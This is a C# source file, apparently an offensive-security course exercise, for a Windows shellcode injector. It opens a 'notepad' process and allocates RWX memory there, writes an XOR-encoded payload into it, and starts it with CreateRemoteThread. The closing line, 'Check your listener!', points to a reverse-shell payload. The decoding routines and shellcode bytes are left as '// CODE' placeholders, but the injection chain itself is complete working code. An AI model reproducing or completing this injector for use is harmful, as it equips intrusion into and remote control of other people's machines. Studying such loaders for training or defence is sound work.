using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Injector
{
    public class BasicShellcodeInjector
    {

        // More P/Invoke definitions!
        // Enums modified to only include relevant options

        // https://pinvoke.net/default.aspx/kernel32/OpenProcess.html
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        // https://pinvoke.net/default.aspx/kernel32/VirtualAllocEx.html
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }
        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr procHandle, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        // https://pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandle, IntPtr lpBaseAddress, byte[] lpscfer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // https://pinvoke.net/default.aspx/kernel32/CreateRemoteThread.html
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr procHandle, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // C# xorDecodeBytes routine
        // CODE

        // C# xorDecodeString routine
        // CODE

        public static void Main()
        {

            // XOR Key
            // CODE

            // Define our shellcode as a csharp byte array
            
            // XOR encoded shellcode C# Byte Array
            // CODE

            // C# shellcode decoding
            // CODE

            int len = buf.Length;

            // Define process to inject into
            
            // XOR encoded string C# Byte Array
            // CODE

            // C# string decoding
            // CODE    
            
            string targetProc = "notepad";

            // Get a list of processes matching the target name
            Process[] expProc = Process.GetProcessesByName(targetProc);
            if(expProc.Length == 0){ 
                Console.WriteLine($"No {targetProc} found. Is it running?");
                return;
             }

            // Resolve the Process ID (PID) of the target
            int pid = expProc[0].Id;
            Console.WriteLine($"Target process: {targetProc} [{pid}].");

            // Get a handle on the target process in order to interact with it
            IntPtr procHandle = OpenProcess(ProcessAccessFlags.All, false, pid);
            if ((int)procHandle == 0)
            {
                Console.WriteLine($"Failed to get handle on PID {pid}. Do you have the right privileges?");
                return;
            } else {
                Console.WriteLine($"Got handle {procHandle} on target process.");
            }

            // Allocate RWX memory in the remote process
            // The opsec note from exercise 1 is applicable here, too
            IntPtr memAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, 
                MemoryProtection.ExecuteReadWrite);
            Console.WriteLine($"Allocated {len} bytes at address {memAddr} in remote process.");

            // Write the payload to the allocated bytes in the remote process
            IntPtr bytesWritten;
            bool procMemResult = WriteProcessMemory(procHandle, memAddr, buf, len, out bytesWritten);
            if(procMemResult){
                Console.WriteLine($"Wrote {bytesWritten} bytes.");
             } else {
                Console.WriteLine("Failed to write to remote process.");
             }

            // Create our remote thread to execute!
            IntPtr tAddr = CreateRemoteThread(procHandle, IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine($"Created remote thread at {tAddr}. Check your listener!");

        }
    }
}